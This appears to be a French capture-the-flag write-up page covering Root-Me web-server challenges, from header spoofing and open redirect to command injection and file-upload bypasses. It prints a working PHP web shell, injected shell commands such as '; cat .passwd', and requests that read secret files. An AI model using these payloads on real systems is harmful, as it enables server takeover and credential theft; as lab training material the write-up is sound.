+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#html-code-source" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML Code Source
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-contournement-de-filtrage-ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Contournement de Filtrage IP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Open Redirect
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - User Agent
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mot-de-passe-faible" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mot de passe faible
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-injection-de-commande" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP - Injection de Commande
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fichier-de-sauvegarde" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fichier de sauvegarde
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#directory-indexing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directory Indexing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Headers
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - POST
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-redirection-invalide" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Redirection invalide
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-verb-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Verb tampering
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#install-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Install files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload-double-extensions" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Upload - Double extensions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload-type-mime" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Upload - Type MIME
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+    
+                  
+
+
+
+  <h1>Web Serveur</h1>
+
+<h2 id="html-code-source">HTML Code Source<a class="headerlink" href="#html-code-source" title="Permanent link">&para;</a></h2>
+<p>Inspecter l'élément et Expand All, on peut voir deux commentaires HTML et à l'intérieur, nous avons le mot de passe !</p>
+<h2 id="http-contournement-de-filtrage-ip">HTTP - Contournement de Filtrage IP<a class="headerlink" href="#http-contournement-de-filtrage-ip" title="Permanent link">&para;</a></h2>
+<p>En faisant la commande suivante, on indique dans la requête que nous demandons l'accès à la page depuis une adresse IP privé pour contourner la page de connexion :
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-Forwarded-For: 10.0.0.1&quot;</span><span class="w"> </span>http://URL_DU_SITE
+</code></pre></div></p>
+<p>Et, nous avons maintenant le mot de passe !</p>
+<h2 id="http-open-redirect">HTTP - Open Redirect<a class="headerlink" href="#http-open-redirect" title="Permanent link">&para;</a></h2>
+<p>En arrivant sur la page, on remarque qu'il n'y a seulement des liens de réseaux sociaux disponibles comme Facebook, Twitter &amp; Slack.
+Sauf que ces liens, écrits en HTML, sont écrits sous forme suivante :</p>
+<p><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;?url=https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134&#39;</span><span class="p">&gt;</span>facebook<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+On peut voir que le lien prend l'url de la page actuelle et utilise deux params :
+- <code>url</code> : ce params corresponds à l'url de destination
+- <code>h</code> : ce params corresponds au Hash en MD5 de l'url de de destination
+(en faisant une recherche sur le site <a href="https://hashes.com/en/tools/hash_identifier">Hashes</a>, on peut voir l'algorithme de hash utilisé, et même sa valeur de départ…) </p>
+<p>Donc, nous avons définir un nouveau lien qui emmènera vers une autre page comme <a href="https://evil.com">https://evil.com</a> et que nous allons hasher en MD5 :
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;https://evil.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>md5sum
+</code></pre></div></p>
+<p>Voici notre lien que nous allons donné au site web du challenge :
+<div class="highlight"><pre><span></span><code>?url<span class="o">=</span>https://evil.com<span class="p">&amp;</span><span class="nv">h</span><span class="o">=</span>7a1eb5272a0de83226e7a50d14334056
+</code></pre></div></p>
+<p>Avant de le renseigner dans le navigateur, on doit désactiver le javascript de notre navigateur : Sur Kali Linux, on a Firefox et si on va dans l'onglet <code>about:config</code>, on fait passer cette valeur à <code>false</code> :
+<div class="highlight"><pre><span></span><code>javascript.enabled<span class="w">                                  </span><span class="nb">false</span>
+</code></pre></div></p>
+<p>Une fois fait, nous avons bien une nouvelle page qui s'affiche où on peut trouver le mot de passe !</p>
+<h2 id="http-user-agent">HTTP - User Agent<a class="headerlink" href="#http-user-agent" title="Permanent link">&para;</a></h2>
+<p>En faisant la commande suivante, on indique dans la requête que nous demandons l'accès à la page avec un user agent appelé <code>admin</code> pour contourner la page :
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="w"> </span>http://URL_DU_SITE
+</code></pre></div></p>
+<p>Et, nous avons maintenant le mot de passe ! </p>
+<h2 id="mot-de-passe-faible">Mot de passe faible<a class="headerlink" href="#mot-de-passe-faible" title="Permanent link">&para;</a></h2>
+<p>Rien à dire : Identifiant : <code>admin</code> / Mot de passe : <code>admin</code></p>
+<h2 id="php-injection-de-commande">PHP - Injection de Commande<a class="headerlink" href="#php-injection-de-commande" title="Permanent link">&para;</a></h2>
+<p>On nous indique que nous devons lire le contenu du fichier <code>index.php</code>.</p>
+<p>Nous avons un site avec un input pour renseigner une adresse IP que le serveur va <code>ping</code> et afficher le résultat sur la page. Alors, on indique qu'on veut faire le ping, puis exécuter la commande suivante pour afficher le contenu du fichier :
+<div class="highlight"><pre><span></span><code><span class="m">127</span>.0.0.1<span class="w"> </span><span class="p">;</span><span class="w"> </span>php<span class="w"> </span>-s<span class="w"> </span>index.php
+</code></pre></div>
+Le séparateur <code>;</code> nous permet d'exécuter une autre commande et nous avons utilisé <code>php -s</code> pour faire afficher en sortie la syntaxe HTML avec le code PHP surligné.</p>
+<p>On peut voir la variable $flag suivante, qui nous parle d'un fichier <code>.passwd</code> :
+<div class="highlight"><pre><span></span><code><span class="x">$flag = &quot;&quot;.file_get_contents(&quot;.passwd&quot;).&quot;&quot;;</span>
+</code></pre></div></p>
+<p>Donc, nous avons besoin de faire afficher le contenu du fichier avec la commande suivante :
+<div class="highlight"><pre><span></span><code><span class="m">127</span>.0.0.1<span class="w"> </span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>.passwd
+</code></pre></div></p>
+<p>Et, nous obtenons le mot de passe !</p>
+<h2 id="fichier-de-sauvegarde">Fichier de sauvegarde<a class="headerlink" href="#fichier-de-sauvegarde" title="Permanent link">&para;</a></h2>
+<p>Nous avons une page de login et l'indication de fichier de sauvegarde.
+Nous devons trouver l'extension de fichier de sauvegarde de notre page de connexion :
+- <code>.bak</code>
+- <code>.old</code> 
+- <code>.~</code>
+et celui qui est présent, a le nom <code>index.php~</code>. On l'affiche avec curl :
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://URL_DU_SITE/index.php~
+</code></pre></div></p>
+<p>Et, on obtient les identifiants de connexion !</p>
+<h2 id="directory-indexing">Directory Indexing<a class="headerlink" href="#directory-indexing" title="Permanent link">&para;</a></h2>
+<p>Nous arrivons devant une page blanche. Analysons alors le code et on trouve le commentaire suivant : 
+<div class="highlight"><pre><span></span><code><span class="x">include(&quot;admin/pass.html&quot;)</span>
+</code></pre></div></p>
+<p>Allons voir le contenu de ce fichier, et nous sommes tombés dans le piège du développeur. 
+<div class="highlight"><pre><span></span><code>http://URL_DU_SITE/admin/pass.html
+</code></pre></div></p>
+<p>Pour autant, ce piège nous indique qu'il y a bien un dossier <code>admin</code>, allons plutôt voir la page indexé au dossier : un <code>Index of /</code> !</p>
+<div class="highlight"><pre><span></span><code>http://URL_DU_SITE/admin/
+</code></pre></div>
+<p>Nous pouvons voir grâce a cette page, les différents fichiers ou dossiers présents dans le dossier <code>admin</code>, et nous avons un dossier <code>backup</code> avec le fichier <code>admin.txt</code> : 
+<div class="highlight"><pre><span></span><code>http://URL_DU_SITE/admin/backup/admin.txt
+</code></pre></div></p>
+<p>Et, nous obtenons le mot de passe :</p>
+<h2 id="http-headers">HTTP Headers<a class="headerlink" href="#http-headers" title="Permanent link">&para;</a></h2>
+<p>Cette indice nous indique que nous allons manipuler le <code>header</code>, ou "en-tête" en français, de notre requête vers la page pour avoir l'accès admin.</p>
+<p>Il est possible d'utiliser Burp Suite mais curl fera l'affaire et avec plusieurs tentatives, voici le seul Header qui a marché :
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Header-RootMe-Admin: admin&quot;</span><span class="w"> </span>http://URL_DU_SITE
+</code></pre></div></p>
+<p>Et, nous avons le mot de passe !</p>
+<h2 id="http-post">HTTP - POST<a class="headerlink" href="#http-post" title="Permanent link">&para;</a></h2>
+<p>Nous avons un jeu complètement injuste où nous devons dépassé le score de <code>999999</code> du développeur... Ici, nous devons trouver un moyen de modifier notre score pour qu'il dépasse celui du développeur, sans faire de multiples tentatives sur le site. (Oui, on va tricher !)</p>
+<p>Pour cela, on va utiliser <code>Burp Suite</code>, qui va se placé en tant que Proxy, en intermédiaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requête et permettre de la modifier.</p>
+<p>Tout d'abord, nous allons dans les paramètres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par défaut : <code>127.0.0.1:8080</code>.</p>
+<p>On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir <code>Intercept is on</code>. Puis, on fais une tentative du jeu depuis notre navigateur, de retour sur Burp, on peut voir notre requête avec le <code>query</code> score :</p>
+<div class="highlight"><pre><span></span><code><span class="nv">score</span><span class="o">=</span><span class="m">623530</span><span class="p">&amp;</span><span class="nv">generate</span><span class="o">=</span>Give+a+try%21
+<span class="nv">score</span><span class="o">=</span><span class="m">1000000000000000000000</span><span class="p">&amp;</span><span class="nv">generate</span><span class="o">=</span>Give+a+try%21
+</code></pre></div>
+<p>On définit un score arbitrairement plus grand que <code>999999</code> et on clique sur <code>Forward</code>, pour envoyer notre requête au serveur. 
+Et, on obtient le mot de passe !</p>
+<h2 id="http-redirection-invalide">HTTP - Redirection invalide<a class="headerlink" href="#http-redirection-invalide" title="Permanent link">&para;</a></h2>
+<p>Nous arrivons devant une page de connexion et ayant pour indice de trouver un moyen d'afficher la page index.php et de ne pas utiliser notre navigateur web.</p>
+<p>Nous allons devoir utiliser curl pour afficher le contenu de la page index.php, avec la commande suivante :
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://URL_DU_SITE/index.php
+</code></pre></div></p>
+<p>Et, nous avons le mot de passe !</p>
+<blockquote>
+<p>Dans cet exercice, le navigateur web a pour fonctionnement d'effectuer chaque redirection que le serveur lui demande sans réfléchir, d'où l'indice.</p>
+<p>Avec curl, si nous le précisons pas, il ne fait pas de redirection automatique ! C'est ainsi que nous pu voir le contenu de page <code>index.php</code> alors que son code précise bien une redirection vers la page <code>login.php</code> étant donne que nous ne sommes pas connecté.</p>
+<p>Le développeur précise justement que le problème était dû au manque de l'instruction <code>exit()</code> après l'instruction de redirection en PHP <code>header('Location: ...')</code>, qui fait que PHP renvois le contenu de la page.</p>
+</blockquote>
+<h2 id="http-verb-tampering">HTTP - Verb tampering<a class="headerlink" href="#http-verb-tampering" title="Permanent link">&para;</a></h2>
+<p>Nous avons une alert qui nous demande de nous connecter pour accéder à la page, le navigateur ne nous serviras pas ici encore. L'indice nous indique que nous pouvons contourner les mécanismes de sécurité en manipulant les requêtes HTTP. Pour cela, nous allons utiliser curl et utiliser les differentes méthodes de requêtes HTTP :
+- GET
+- POST
+- PUT
+- DELETE</p>
+<p>Les méthodes GET et POST ont été bloques mais pas PUT et DELETE. 
+Voici les commandes curl suivantes : 
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://URL_DU_SITE/
+curl<span class="w"> </span>-X<span class="w"> </span>DELETE<span class="w"> </span>http://URL_DU_SITE/
+</code></pre></div></p>
+<p>Et, on obtient le mot de passe !</p>
+<h2 id="install-files">Install files<a class="headerlink" href="#install-files" title="Permanent link">&para;</a></h2>
+<p>Nous avons une page blanche, en inspectant le code, nous avons seulement un commentaire nous indiquant l'existante du dossier <code>/phpbb</code>, comme préciser dans l'indice. Il nous dit aussi qu'il n'a pas fini de l'installer alors on va chercher ces fichier d'installation.</p>
+<p>En cherchant, on tombe sur un dossier <code>/install</code>. En y allant, on tombe sur  un <code>Index of /</code> avec le fichier <code>install.php</code>! On clique dessus et le script PHP s'exécute, et on a le mot de passe !</p>
+<blockquote>
+<p>Comme préciser par le développeur, cette faille est du a l'oubli de supprimer les fichiers d'installation de PHPBB, ce qui nous permet dans un cas réel, de réinitialiser le forum et de changer tous les mot de passes car on le réinstalle !</p>
+</blockquote>
+<h2 id="file-upload-double-extensions">File Upload - Double extensions<a class="headerlink" href="#file-upload-double-extensions" title="Permanent link">&para;</a></h2>
+<p>Nous arrivons sur un site avec plusieurs pages en liens avec des photos (émotes, app, devices, catégories, etc.) mais il y a un lien intéressant, c'est celui de <code>upload</code> où l'on peut faire télécharger au serveur des images sous format <code>.gif</code>, <code>.jpg</code> et <code>.png</code>.</p>
+<p>Le but est de faire télécharger un code php qui nous permettent d'afficher le fichier <code>.passwd</code> à la racine, ce qui est notamment préciser en indice du défi.</p>
+<p>Il indique "Double extensions", en recherchant sur Internet, je trouve que les fichiers <code>.php</code> peuvent être convertit en <code>.php.jpg</code> ou autre, et toujours fonctionner ! </p>
+<p>J'ai écrit et uploade ce code PHP qui permet d'exécuter des commandes <code>shell</code> depuis l'url en méthode GET avec le params <code>cmd</code> :
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code>http://URL_DU_SITE/galerie/upload/97e70afeabcafb72cdc02329879ca861/shell.php.jpg
+</code></pre></div>
+<p>Une fois upload, on doit ajouter dans l'url le params cmd et de commencer pour se repérer, à faire la commande ls -la pour lister les éléments presents dans le dossier actuelle :
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>ls<span class="w"> </span>la
+</code></pre></div></p>
+<p>On peux voir notre code shell mais nous devons trouver la racine où se trouve le fichier <code>.passwd</code> et que l'on trouve ici :
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>ls<span class="w"> </span>la<span class="w"> </span>../../../
+</code></pre></div></p>
+<p>On utilise cat pour l'afficher et on a le mot de passe !
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>cat<span class="w"> </span>../../../.passwd
+</code></pre></div></p>
+<h2 id="file-upload-type-mime">File Upload - Type MIME<a class="headerlink" href="#file-upload-type-mime" title="Permanent link">&para;</a></h2>
+<p>Nous arrivons sur un site avec plusieurs pages en liens avec des photos (émotes, app, devices, catégories, etc.) mais il y a un lien intéressant, c'est celui de <code>upload</code> où l'on peut faire télécharger au serveur des images sous format <code>.gif</code>, <code>.jpg</code> et <code>.png</code>.</p>
+<p>Le but est de faire télécharger un code PHP qui nous permettent d'afficher le fichier <code>.passwd</code> à la racine, ce qui est notamment préciser en indice du défi.</p>
+<p>J'ai écrit et uploade ce code PHP qui permet d'exécuter des commandes <code>shell</code> depuis l'url en méthode GET avec le params <code>cmd</code> :
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></p>
+<p>Cette fois-ci, le serveur web affiche l'image avec la balise HTML <code>&lt;img&gt;</code> le fichier uploadé car il a l'extension <code>.jpg</code>, ce qui provoque évidemment une erreur d'affichage et un blocage de l'exécution du fichier PHP. </p>
+<p>On doit alors forcer le téléchargement du fichier avec son extension <code>.php</code>, sauf que le Javascript du Site web nous bloque avec les extensions <code>.gif</code>, <code>.jpg</code> et <code>.png</code> uniquement. </p>
+<p>La solution est d'utiliser <code>Burp Suite</code>, qui va se placé en tant que Proxy, en intermédiaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requête et permettre de la modifier.</p>
+<p>Tout d'abord, nous allons dans les paramètres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par défaut : <code>127.0.0.1:8080</code>.</p>
+<p>On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir <code>Intercept is on</code>. Puis, on upload le fichier en <code>.php.jpg</code> depuis notre navigateur, de retour sur Burp, on peut voir notre requête avec le nom du fichier avec l'extension <code>.php.jpg</code>. </p>
+<p>On renomme le fichier en <code>.php</code> et on clique sur <code>Forward</code>, pour envoyer notre requête au serveur. Et, le fichier a bien été uploadé sur le serveur :
+<div class="highlight"><pre><span></span><code>http://URL_DU_SITE/galerie/upload/437h893h84h03u48/shell.php
+</code></pre></div></p>
+<p>Une fois uploadé, on doit ajouter dans l'url le params <code>cmd</code> et de commencer pour se repérer, à faire la commande ls -la pour lister les éléments présents dans le dossier actuelle :
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>ls<span class="w"> </span>-la
+</code></pre></div></p>
+<p>On peux voir notre code shell mais nous devons trouver la racine où se trouve le fichier <code>.passwd</code> et que l'on trouve ici :
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>ls<span class="w"> </span>-la<span class="w"> </span>../../../
+</code></pre></div></p>
+<p>On utilise cat pour l'afficher et on a le mot de passe !
+<div class="highlight"><pre><span></span><code>?cmd<span class="o">=</span>cat<span class="w"> </span>../../../.passwd
+</code></pre></div></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+    <div class="print-button-wrapper">
+        <button onclick="window.print()" title="Imprimer cette page">🖨️ Imprimer</button>
+    </div>
+
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../Cryptanalyse/Hash%20-%20DCC2/Hash%20-%20DCC2/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Hash   DCC2">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Hash   DCC2
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../TryHackMe/" class="md-footer__link md-footer__link--next" aria-label="Next: ⚔️ TryHackMe – Write-Ups">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                ⚔️ TryHackMe – Write-Ups
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025 Thibaut Vandier
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.reddit.com/user/redt974/" target="_blank" rel="noopener" title="www.reddit.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M0 256C0 114.6 114.6 0 256 0s256 114.6 256 256-114.6 256-256 256H37.1c-13.7 0-20.5-16.5-10.9-26.2L75 437C28.7 390.7 0 326.7 0 256m349.6-102.4c23.6 0 42.7-19.1 42.7-42.7s-19.1-42.7-42.7-42.7c-20.6 0-37.8 14.6-41.8 34-34.5 3.7-61.4 33-61.4 68.4v.2c-37.5 1.6-71.8 12.3-99 29.1-10.1-7.8-22.8-12.5-36.5-12.5-33 0-59.8 26.8-59.8 59.8 0 24 14.1 44.6 34.4 54.1 2 69.4 77.6 125.2 170.6 125.2s168.7-55.9 170.6-125.3c20.2-9.6 34.1-30.2 34.1-54 0-33-26.8-59.8-59.8-59.8-13.7 0-26.3 4.6-36.4 12.4-27.4-17-62.1-27.7-100-29.1v-.2c0-25.4 18.9-46.5 43.4-49.9 4.4 18.8 21.3 32.8 41.5 32.8zm-172.5 93.3c16.7 0 29.5 17.6 28.5 39.3s-13.5 29.6-30.3 29.6-31.4-8.8-30.4-30.5S160.3 247 177 247zm190.1 38.3c1 21.7-13.7 30.5-30.4 30.5s-29.3-7.9-30.3-29.6 11.8-39.3 28.5-39.3 31.2 16.6 32.1 38.3zm-48.1 56.7c-10.3 24.6-34.6 41.9-63 41.9s-52.7-17.3-63-41.9c-1.2-2.9.8-6.2 3.9-6.5 18.4-1.9 38.3-2.9 59.1-2.9s40.7 1 59.1 2.9c3.1.3 5.1 3.6 3.9 6.5"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/redt974" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thibaut-vandier-558b47285/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
